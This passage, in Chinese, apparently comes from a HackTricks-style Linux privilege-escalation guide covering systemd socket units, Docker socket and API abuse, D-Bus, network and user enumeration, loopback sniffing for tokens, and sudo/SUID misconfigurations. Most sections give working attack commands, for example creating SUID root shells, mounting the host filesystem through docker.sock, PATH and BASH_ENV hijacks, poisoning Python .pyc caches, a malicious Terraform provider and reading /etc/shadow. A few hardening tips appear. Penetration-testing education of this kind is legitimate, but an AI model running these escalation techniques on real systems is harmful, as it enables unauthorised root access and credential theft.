- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项各不相同，但总体上用于**指定套接字监听的位置**（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`：接受一个布尔值。如果为 **true**，则**为每个传入连接启动一个服务实例**，并且只将连接套接字传递给它。如果为 **false**，则将所有监听套接字本身**传递给已启动的服务单元**，并为所有连接只启动一个服务单元。对于数据报套接字和 FIFO，此值会被忽略，因为无论如何都由单个服务单元处理所有传入流量。**默认为 false**。出于性能考虑，建议编写的新守护进程只采用适用于 `Accept=no` 的方式。
- `ExecStartPre`、`ExecStartPost`：接受一条或多条命令行，分别在监听**套接字**/FIFO **创建**并绑定之前或之后**执行**。命令行的第一个标记必须是绝对文件名，后面再跟进程的参数。
- `ExecStopPre`、`ExecStopPost`：分别在监听**套接字**/FIFO **关闭**并移除之前或之后**执行**的附加**命令**。
- `Service`：指定在有**传入流量**时**激活**的**服务**单元名称。此设置仅允许用于 `Accept=no` 的套接字。默认情况下，使用与套接字同名的服务（替换后缀）。大多数情况下，无需使用此选项。

### 可写的 .socket 文件

如果发现一个**可写**的 `.socket` 文件，可以在 `[Socket]` 部分的开头**添加**类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，这样 backdoor 就会在套接字创建之前执行。因此，你**可能需要等到机器重启后**。\
_请注意，系统必须正在使用该套接字文件配置，否则 backdoor 不会执行_

### Socket activation + 可写的 unit 路径（创建缺失的服务）

另一种影响很大的错误配置是：

- 一个 `Accept=no` 且设置了 `Service=<name>.service` 的 socket unit
- 被引用的 service unit 不存在
- 攻击者可以写入 `/etc/systemd/system`（或其他 unit 搜索路径）

在这种情况下，攻击者可以创建 `<name>.service`，然后向套接字发送流量，以触发 systemd 加载并以 root 身份执行新服务。

操作流程：

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 可写 socket

如果你**发现任何可写 socket**（_这里说的是 Unix Sockets，而不是配置 `.socket` 文件_），那么**你就可以与该 socket 通信**，并可能利用漏洞。

### 枚举 Unix Sockets

```bash
netstat -a -p --unix
```

### 原始连接

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**利用示例：**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP 套接字

请注意，可能存在一些**正在监听 HTTP** 请求的套接字（_我说的不是 .socket 文件，而是充当 Unix 套接字的文件_）。你可以使用以下命令检查：

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

如果 socket **以 HTTP** 请求作出响应，那么你就可以与其**通信**，并可能**利用某些漏洞**。

### 可写 Docker Socket

Docker socket 通常位于 `/var/run/docker.sock`，是一个必须妥善保护的关键文件。默认情况下，`root` 用户和 `docker` 组成员拥有该文件的写入权限。拥有此 socket 的写入权限可能导致权限提升。以下介绍了实现方法，以及 Docker CLI 不可用时的替代方法。

#### **使用 Docker CLI 进行权限提升**

如果你拥有 Docker socket 的写入权限，可以使用以下命令提升权限：<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

这些命令允许你运行一个可访问主机文件系统 root 权限的容器。

#### **直接使用 Docker API**

如果 Docker CLI 不可用，仍然可以通过 Unix socket 上的原始 HTTP 滥用 Docker socket。最可靠的流程是：

- 创建一个长期运行的辅助容器，并将主机 root 目录 bind mount 到容器中
- 启动它
- 在该辅助容器中创建一个 `exec` 实例
- 启动该 `exec` 实例，并通过 API 读取输出

**列出 Docker 镜像**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**创建并启动辅助容器**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**创建一个 exec 实例**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**启动 exec 实例并读取输出**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

这种模式通常比尝试通过 `socat` 或 `nc -U` 手动驱动 `attach` 更稳健。一旦你能使用 `/:/host` 创建 helper，就可以使用额外的 `exec` 实例读取 `/host/root/...` 等文件、在 `/host/root/.ssh` 下添加 SSH keys，或修改主机启动文件。

### 其他

请注意，如果你**属于 `docker` 组**，因此对 docker socket 拥有写入权限，你就有[**更多提权方式**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API 正在某个端口上监听**，你也可能能够攻陷它](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下页面中查看**更多逃逸容器或滥用容器运行时进行提权的方法**：


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) 提权

如果你发现自己可以使用 **`ctr`** 命令，请阅读以下页面，因为**你或许可以滥用它来提权**：


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 提权

如果你发现自己可以使用 **`runc`** 命令，请阅读以下页面，因为**你或许可以滥用它来提权**：


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一种复杂的**进程间通信 (IPC) 系统**，可让应用程序高效地交互和共享数据。它针对现代 Linux 系统设计，为不同形式的应用程序通信提供了稳健的框架。<sup>[[16]](#references)</sup>

该系统用途广泛，支持基本 IPC，增强进程间的数据交换，类似于**增强型 UNIX domain sockets**。此外，它还可以广播事件或信号，促进系统组件之间的无缝集成。例如，Bluetooth daemon 发出的来电信号可以让音乐播放器静音，从而提升用户体验。D-Bus 还支持远程对象系统，简化应用程序间的服务请求和方法调用，使传统上较为复杂的流程更加简便。

D-Bus 采用 **allow/deny 模型**，根据匹配策略规则的综合效果管理消息权限（方法调用、信号发送等）。这些策略规定了与总线交互的方式，可能导致攻击者通过利用这些权限实现提权。

以下示例策略位于 `/etc/dbus-1/system.d/wpa_supplicant.conf`，其中详细说明了 root 用户拥有 `fi.w1.wpa_supplicant1`、向其发送消息以及接收其消息的权限。

未指定用户或组的策略适用于所有用户和组，而“default”上下文策略则适用于其他特定策略未涵盖的所有情况。

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**学习如何枚举并利用 D-Bus 通信：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

枚举网络并了解机器所处的位置总是很有意思的。

### 通用枚举

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

如果启用的 `/etc/inetd.conf` 条目以 root 身份运行 GNU Inetutils `telnetd`，请检查配置的二进制文件版本和本地监听器，即使端口仅绑定到 loopback 也是如此。GNU Inetutils 1.9.3 至 2.7 存在 [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89)，其中客户端提供的 `USER` 会传递给 `login -f`（CVE-2026-24061）。进程或版本字符串只是一个指示；在判定其存在暴露风险之前，请确认供应商补丁状态和实际运行的守护进程。[Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) 中有更多详情。

### Outbound filtering quick triage

如果主机可以运行命令，但回连失败，请快速区分 DNS、传输、代理和路由过滤：

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### 开放端口

在访问机器之前，始终检查你无法与之交互的网络服务：

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

按绑定目标对监听服务分类：

- `0.0.0.0` / `[::]`：暴露在所有本地网络接口上。
- `127.0.0.1` / `::1`：仅本地可访问（适合作为 tunnel/forward 候选）。
- 特定内网 IP（例如 `10.x`、`172.16/12`、`192.168.x`、`fe80::`）：通常只能从内部网段访问。

### 仅本地服务排查流程

入侵主机后，绑定到 `127.0.0.1` 的服务通常会首次变得可从你的 shell 访问。一个快速的本地排查流程是：

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS 作为网络扫描器（仅网络模式）

除了本地 PE 检查，linPEAS 还可以作为专用网络扫描器运行。它会使用 `$PATH` 中可用的二进制文件（通常是 `fping`、`ping`、`nc`、`ncat`），不会安装工具。

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

如果不使用 `-t` 而传入 `-d`、`-p` 或 `-i`，linPEAS 会作为纯网络扫描器运行（跳过其余提权检查）。

### Sniffing

检查你是否能够嗅探流量。如果可以，你或许能够获取一些凭据。

```
timeout 1 tcpdump
```

快速实用检查：

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback（`lo`）在 post-exploitation 阶段尤其有价值，因为许多仅限内部访问的服务会在此暴露 tokens/cookies/credentials：

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

先捕获，稍后解析：

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## 用户

### 通用枚举

检查你是**谁**、拥有哪些**权限**、系统中有哪些**用户**、哪些用户可以**登录**，以及哪些用户拥有 **root 权限**：

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### 大 UID

某些 Linux 版本受到一个漏洞影响，该漏洞允许 **UID > INT_MAX** 的用户提升权限。更多信息：[这里](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[这里](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和[这里](https://twitter.com/paragonsec/status/1071152249529884674)。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**利用它**：**`systemd-run -t /bin/bash`**

### 群组

检查你是否属于某个可能授予你 root 权限的**群组**：


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有有用的内容（如果可以）

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### 密码策略

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Known passwords

如果你**知道环境中的任何密码**，请尝试使用该密码登录每个用户。

### Su Brute

如果你不介意制造大量噪声，并且计算机上存在 `su` 和 `timeout` 二进制文件，可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce) 对用户进行暴力破解。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数时也会尝试对用户进行暴力破解。

## Writable PATH abuses

### $PATH

如果你发现自己可以**写入 $PATH 中的某个文件夹**，就可以尝试通过**在该可写文件夹中创建后门**来提升权限：将后门命名为其他用户（最好是 root）将要执行的某个命令，并确保该命令**不会从 $PATH 中位于你的可写文件夹之前的文件夹加载**。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者这些命令可能带有 suid 位。使用以下命令检查：

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

某些**意想不到的命令允许你读取和/或写入文件，甚至执行命令**。<sup>[[8]](#references)</sup> 例如：

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo 配置可能允许用户在不知道另一用户密码的情况下，以该用户的权限执行某些命令。

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

在此示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在只需将 SSH key 添加到 root 目录或调用 `sh`，就能轻松获取 shell。

```
sudo vim -c '!sh'
```

### sudo 脚本中的未加引号 Bash 比较

在 Bash 中，`[[ "$protected" == $candidate ]]` 的右侧是一个 pattern。如果具有 root 权限的 sudo 脚本从调用者可控的文件中填充 `candidate`，那么像 `prefix*` 这样的值就可能匹配受保护字符串的开头。不同的成功和错误路径可能因此泄露前缀 oracle。如果预期进行字面值相等比较，请给右侧加引号（`[[ "$protected" == "$candidate" ]]`）。在认定未加引号的比较可被利用之前，请检查实际的 sudo 参数、输入来源和可观察到的分支行为。[GNU Bash 手册](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html)说明了这种 pattern 行为。

### 通过 sudo 处理 PrusaSlicer 项目文件

如果调用者可以选择要切片的 `.3mf` 项目，那么应检查授予 `prusaslicer` 或 `prusa-slicer` 不受限制的 root 权限的 sudo 规则。项目可以包含一个在导出 G-code 时运行的后处理脚本；通过 2.6.1 版本的 PrusaSlicer，特制项目可能会执行命令（[CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)）。在认定该权限边界可被突破之前，请确认实际生效的 sudo 规则、二进制文件版本和供应商补丁、项目来源，以及相关导出路径是否会运行。固定的项目参数或生效的 `NOEXEC` 策略可能改变结果。仅发现系统安装了切片器，并不能证明存在提权路径。

### SETENV

此指令允许用户在执行某个程序时**设置环境变量**：

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

此示例**基于 HTB machine Admirer**，**易受 PYTHONPATH hijacking 攻击**，可在以 root 身份执行脚本时加载任意 Python 库：

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo 允许的 Python 导入中的可写 `__pycache__` / `.pyc` 投毒

如果**sudo 允许运行的 Python 脚本**导入的模块，其包目录中包含**可写的 `__pycache__`**，你可能可以替换缓存的 `.pyc`，并在下次导入时以特权用户身份执行代码。<sup>[[30]](#references)</sup>

- 原理：
  - CPython 会将字节码缓存存储在 `__pycache__/module.cpython-<ver>.pyc` 中。<sup>[[31]](#references)</sup>
  - 解释器会验证**头部**（与源文件关联的 magic 值 + 时间戳/哈希元数据），然后执行存储在头部之后的 marshaled 代码对象。
  - 如果目录可写，你可以**删除并重新创建**缓存文件，因此即使 `.pyc` 属于 root 且不可写，也仍然可以替换它。
- 常见路径：
  - `sudo -l` 显示一个你可以以 root 身份运行的 Python 脚本或包装器。
  - 该脚本从 `/opt/app/`、`/usr/local/lib/...` 等位置导入本地模块。
  - 该模块的 `__pycache__` 目录对你的用户或所有人可写。

快速枚举：

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

如果可以检查特权脚本，请识别导入的模块及其缓存路径：<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

利用流程：

1. 运行一次允许通过 sudo 执行的脚本，让 Python 创建合法的缓存文件（如果该文件尚不存在）。
2. 从合法的 `.pyc` 文件读取前 16 个字节，并在投毒后的文件中复用这些字节。
3. 编译一个 payload 代码对象，对其执行 `marshal.dumps(...)`，删除原始缓存文件，然后用原始文件头和恶意字节码重新创建缓存文件。
4. 再次运行允许通过 sudo 执行的脚本，使导入操作以 root 身份执行你的 payload。

重要说明：

- 复用原始文件头至关重要，因为 Python 会检查缓存元数据是否与源文件匹配，而不会检查字节码主体是否真的与源文件内容一致。
- 如果源文件归 root 所有且不可写，但其所在的 `__pycache__` 目录可写，这种方法尤其有用。
- `PYTHONDONTWRITEBYTECODE=1` 和 `python -B` 会阻止 Python 写入新的 `.pyc` 文件；但它们**不会**阻止 Python 加载已存在且有效的、被攻击者替换的缓存。关键在于低权限用户能否替换特权导入操作会接受的缓存。Python 会在加载缓存字节码前检查时间戳/大小或哈希元数据。请参阅 [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) 和 [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE)。

最小概念验证示例：

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening：

- 确保特权 Python 导入路径中的目录（包括 `__pycache__`）都不可被低权限用户写入。
- 审计缓存目录的所有权和权限，包括现有的 `.pyc` 文件。禁用字节码写入可以减少新缓存的创建，但无法防止现有缓存被替换。
- 对待可写的本地 Python 模块和可写的缓存目录时，应与对待由 root 执行的可写 shell 脚本或共享库一样。

### 通过 sudo env_keep 保留 BASH_ENV → root shell

如果 sudoers 保留了 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），那么在调用获准执行的命令时，你可以利用 Bash 的非交互式启动行为，以 root 身份运行任意代码。<sup>[[24]](#references)</sup>

- 原理：对于非交互式 shell，Bash 会先解析 `$BASH_ENV` 并 source 该文件，然后再运行目标脚本。许多 sudo 规则允许运行脚本或 shell wrapper。如果 sudo 保留了 `BASH_ENV`，你的文件就会以 root 权限被 source。<sup>[[23]](#references)</sup>

- 要求：
  - 有一条你可以运行的 sudo 规则（目标可以是任何会以非交互方式调用 `/bin/bash` 的命令，或任何 Bash 脚本）。
  - `BASH_ENV` 已包含在 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC：

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- 加固：
  - 从 `env_keep` 中移除 `BASH_ENV`（和 `ENV`），优先使用 `env_reset`。
  - 避免为 sudo 允许执行的命令使用 shell wrappers；改用精简的二进制文件。
  - 考虑启用 sudo I/O 日志，并在使用保留的环境变量时发出警报。

### 通过 sudo 使用保留的 HOME 运行 Terraform（!env_reset）

当 sudo 允许以更高权限用户身份运行 Terraform 时，`!env_reset` 提示你检查该规则实际会保留哪些环境变量。在将调用者可写的 `.terraformrc` 或 `terraform.rc` 视为生效的 CLI 配置之前，请确认实际生效的 `HOME` 或 `TF_CLI_CONFIG_FILE`。只有当指定的 Terraform 命令会加载相应 provider，且调用者能将其可执行文件放入所选目录时，`provider_installation.dev_overrides` 条目才会起作用。<sup>[[25]](#references)</sup>

- 将所需的 provider 指向可写目录，并放入一个以该 provider 命名的恶意 plugin（例如：`terraform-provider-examples`）：

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform 会因 Go plugin handshake 失败，但在退出前会以 root 身份执行 payload，留下一个 SUID shell。

### TF_VAR 覆盖 + symlink 验证绕过

如果特定 sudo 规则保留这些环境变量，就可以通过 `TF_VAR_<name>` 环境变量提供 Terraform 变量。读取 source symlink 还需要一个会跟随该链接、并将受保护的结果复制到调用者可读目标位置的 provider。单独来说，写入 destination symlink 需要一个由调用者控制的目标条目，以及一个会在写入时跟随它的特权 provider；后续计划任务只是可能的后果之一。在测试任一途径前，使用 `sudo -l`、`stat` 和 `readlink` 等只读命令检查确切的 sudo 授权、相关 `.tf` 文件、所选 CLI 配置和路径所有权。类似 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 这样的宽松词法验证不会解析 symlink：<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform 会解析符号链接，并将真实的 `/root/root.txt` 复制到攻击者可读取的目标位置。也可以使用相同的方法向特权路径**写入**内容：预先创建目标符号链接（例如，将 provider 的目标路径指向 `/etc/cron.d/` 内）。

### requiretty / !requiretty

在一些较旧的发行版中，sudo 可以配置为使用 `requiretty`，强制 sudo 只能从交互式 TTY 运行。如果设置了 `!requiretty`（或未设置该选项），则可以从非交互式上下文运行 sudo，例如反向 shell、cron 作业或脚本。

```bash
Defaults !requiretty
```

这本身并不是直接漏洞，但它会扩大可滥用 sudo 规则的情形，而无需完整 PTY。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH`，或 `secure_path` 包含攻击者可写的条目（例如 `/home/<user>/bin`），那么 sudo 允许执行的目标中未限定路径的外部命令可能会被同名命令遮蔽。<sup>[[3]](#references)</sup> 如果没有生效的 `secure_path`，也值得检查，**前提是**该命令的 sudo 环境保留了由调用者控制的 `PATH`；仅仅缺少 `secure_path` 并不能证明这一点。阅读获准执行的脚本，但不要运行它；然后核实确切的 RunAs 和参数规则、生效的命令搜索路径，以及一个排在前面、可写且可遍历并包含该命令名称的目录。身份验证、`NOEXEC`、shell 内建命令和绝对命令路径都可能改变结果。

- 要求：存在一条 sudo 规则（通常为 `NOPASSWD`），可运行会调用未使用绝对路径的命令（`free`、`df`、`ps` 等）的脚本或二进制文件；并且存在一个优先搜索且可写的 PATH 条目。

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo 执行：绕过路径
**跳转**以读取其他文件或使用**符号链接**。例如，在 sudoers 文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

如果使用了**通配符**（\*），就更简单了：

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**对策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 未指定命令路径的 Sudo 命令/SUID 二进制文件

如果**sudo 权限**被授予某个命令，**但未指定路径**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它。

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

如果 **suid** binary **执行其他命令时未指定其路径（务必使用** _**strings**_ **检查可疑 SUID binary 的内容）**，也可以使用此 technique。

[要执行的 Payload 示例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### 指定命令路径的 SUID binary

如果 **suid** binary **执行其他命令时指定了路径**，那么你可以尝试创建一个以该命令命名的 **function**。

例如，如果某个 suid binary 调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建并导出该 function：

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

然后，当你调用这个 suid binary 时，这个函数就会被执行

### 自定义 SUID 复制包装器

一个由 root 拥有、接受源路径和目标路径的 SUID 工具，可能跨越两种不同的信任边界。如果它根据任一参数构造 shell 命令（例如，将构造好的 `cp` 命令传递给 `system()`），shell 元字符可能会以其有效权限执行其他命令。即使它不经过 shell 安全地调用 `cp`，不受限制的目标路径也可能允许以特权任意写入文件，例如 `/etc/passwd`。检查包装器如何处理参数、有效 UID 行为、目标路径限制，以及复制的文件是否保留由调用者控制的内容；泛泛的 `cp` 错误或 SUID 位本身都不能证明其中任何一种情况。进行任何手动测试前，先被动枚举该二进制文件及其权限。

### 由 SUID 包装器执行的可写脚本

一种常见的自定义应用配置错误是：由 root 拥有的 SUID 二进制包装器会执行一个脚本，而低权限用户可以写入该脚本。

典型模式：

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

如果 `/usr/local/bin/backup.sh` 可写，你可以追加 payload 命令，然后执行 SUID wrapper：

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

快速检查：

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

此攻击路径在 `/usr/local/bin` 中提供的“maintenance”/“backup”包装程序中尤为常见。

### LD_PRELOAD & **LD_LIBRARY_PATH**

